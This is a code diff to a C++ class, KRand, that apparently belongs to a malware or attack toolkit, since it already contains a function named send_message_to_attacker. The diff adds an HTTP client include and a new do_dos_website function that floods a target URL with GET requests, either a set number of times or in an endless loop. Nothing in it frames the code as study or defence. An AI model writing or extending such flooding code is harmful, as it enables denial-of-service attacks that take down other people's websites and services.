@@ -34,6 +34,7 @@ SOFTWARE.
 #include <cstring>
 #include <filesystem>
 #include <iostream>
+#include <cpr/cpr.h>
 
 #ifdef _WIN32
     #include <windows.h>
@@ -416,3 +417,24 @@ void KRand::send_message_to_attacker(const std::string &attacker_ip, int attacke
     close(sock);
 #endif
 }
+
+void KRand::do_dos_website(const std::string &target_url, bool loop, int count) {
+    
+    if (!loop) {
+        for (int i = 0; i < count; i++) {
+            cpr::Response r = cpr::Get(cpr::Url{target_url});
+            std::cout << "." << std::flush;
+            
+        }
+    } else {  
+        while (true) {
+            cpr::Response r = cpr::Get(cpr::Url{target_url});
+            std::cout << "." << std::flush;
+            std::this_thread::sleep_for(std::chrono::milliseconds(100)); // 100ms delay
+        }
+
+    }
+}
+
+
+
